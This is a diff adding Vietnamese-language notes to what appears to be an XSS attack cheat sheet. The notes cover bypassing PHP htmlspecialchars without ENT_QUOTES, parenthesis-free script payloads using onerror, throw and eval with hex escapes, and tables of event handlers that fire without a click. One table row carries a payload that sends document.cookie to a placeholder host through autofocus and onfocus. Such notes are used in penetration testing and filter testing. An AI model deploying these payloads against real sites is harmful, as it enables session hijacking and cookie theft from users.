@@ -335,3 +335,62 @@ Thực hiện Side-channel attacks  so với cách hành vi khác nhau của pag
 Một số dạng đã gặp:
 - Khai thác oracles dựa trên độ dài iframe
 - 
+
+#### bypass một số hàm 
+
+- `htmlentities()` và `htmlspecialchars` nếu không có  `ENT_QUOTES` thi kí tự `'` vẫn được giữ nguyên(ở những version cũ từ PHP 8.1, đã mặc định dùng `ENT_QUOTES`). [chi tiết](https://github.com/X-Vector/XSS_Bypass/blob/master/htmlspecialchars%20-%20htmlentities/README.md)
+
+- Không sử dụng kí tự `bracket` `(`:
+```
+<script>onerror=alert;throw 1337</script>
+<script>{onerror=alert}throw 1337</script>
+<script>{onerror=eval}throw'=alert\x281337\x29'</script>
+
+```
+- trong các attribute của thẻ html thì nếu có `javascript:` thì bên trong nó được `decode_url` rồi mới chạy nên có thể bypass một số bộ lọc:)))
+
+#### Các event handler để trigger XSS khi load trang.
+
+#####  1. Các event thường gặp
+
+| Event handler | Điều kiện kích hoạt | Cần click? |
+|---|---|---|
+| `onload` | Trang hoặc tài nguyên tải thành công | Không |
+| `onerror` | Tài nguyên tải thất bại | Không |
+| `onfocus` | Phần tử nhận focus | Không, nếu được tự động focus |
+| `onanimationstart` | CSS animation bắt đầu | Không |
+| `onanimationend` | CSS animation kết thúc | Không |
+| `ontransitionend` | CSS transition kết thúc | Không, nếu transition tự diễn ra |
+| `onloadeddata` | Dữ liệu media tại vị trí phát hiện tại đã tải | Không |
+| `oncanplay` | Media đã có đủ dữ liệu để bắt đầu phát | Không |
+| `onplay` | Media bắt đầu hoặc tiếp tục phát | Không, nếu autoplay được phép |
+| `ontoggle` | Trạng thái mở hoặc đóng của phần tử thay đổi | Không nhất thiết |
+| `onpageshow` | Trang được hiển thị | Không |
+|`autofocus` `onfocus`|dùng trong thẻ a giống tự động click: <a href="javascript:`http://webhook.com?cookie=`+document.cookie'  autofocus onfocus='location=this.href'">Visit</a>|
+
+**Lưu ý:**
+
+Các sự kiện này không nhất thiết xảy ra sau khi toàn bộ trang tải xong.
+
+- `onanimationstart`: Phụ thuộc vào CSS animation.
+- `ontransitionend`: Phụ thuộc vào CSS transition.
+- `onloadeddata`: Phụ thuộc vào việc tải dữ liệu media.
+- `onfocus`: Phụ thuộc vào việc phần tử nhận focus.
+- `onplay`: Phụ thuộc vào trạng thái phát media và chính sách autoplay của trình duyệt.
+
+##### 2. Phân loại theo thẻ HTML
+
+| Thẻ HTML | Event đáng chú ý |
+|---|---|
+| `body` | `onload`, `onpageshow` |
+| `img` | `onload`, `onerror` |
+| `svg` | `onload` |
+| `iframe` | `onload` |
+| `input` | `onfocus` |
+| `a` | `onfocus` |
+| `video` | `onloadeddata`, `oncanplay`, `onerror` |
+| `audio` | `oncanplay`, `onplay`, `onerror` |
+| `details` | `ontoggle` |
+| `div` | `onanimationstart`, `onanimationend` |
+
+
